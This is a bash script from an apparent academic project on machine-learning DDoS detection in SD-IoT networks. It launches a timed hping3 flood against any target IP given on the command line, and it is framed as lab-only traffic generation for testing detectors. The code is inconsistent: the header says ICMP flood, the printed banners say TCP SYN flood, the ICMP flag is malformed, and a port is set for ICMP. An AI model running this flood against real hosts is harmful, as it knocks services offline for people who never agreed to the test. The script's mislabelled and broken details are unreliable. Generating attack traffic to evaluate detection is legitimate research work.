#!/usr/bin/env bash
#
# ICMP_flood.sh
#
# Project:
#   DDoS Attack Detection & Mitigation in SD-IoT Networks using Machine Learning
#
# Description:
#   Generates a ICMP Flood attack using hping3 against a target host.
#   Intended for testing the ML-based DDoS detection and mitigation framework.
#
# Usage:
#   ./icmp_flood.sh <Target-IP> [Port] [Duration]
#
# Example:
#   ./icmp_flood.sh 10.0.0.2 80 20
#
# Requirements:
#   - hping3
#   - Root privileges
#
# NOTE:
#   Run only in a controlled laboratory or Mininet environment.
#

set -e

# -----------------------------
# Validate Arguments
# -----------------------------
if [ $# -lt 1 ]; then
    echo "Usage: $0 <Target-IP> [Port] [Duration]"
    echo "Example:"
    echo "  $0 10.0.0.2 80 20"
    exit 1
fi

TARGET_IP="$1"
TARGET_PORT="${2:-80}"
DURATION="${3:-20}"

echo "=========================================="
echo "Attack Type : TCP SYN Flood"
echo "Target      : $TARGET_IP"
echo "Port        : $TARGET_PORT"
echo "Duration    : ${DURATION}s"
echo "=========================================="

# -----------------------------
# Check hping3 Installation
# -----------------------------
if ! command -v hping3 >/dev/null 2>&1; then
    echo "Error: hping3 is not installed."
    exit 1
fi

# -----------------------------
# Start Attack
# -----------------------------
echo "Launching SYN Flood..."

sudo timeout "$DURATION" hping3 \
    -icmp \
    --flood \
    -p "$TARGET_PORT" \
    "$TARGET_IP"

echo
echo "Attack completed."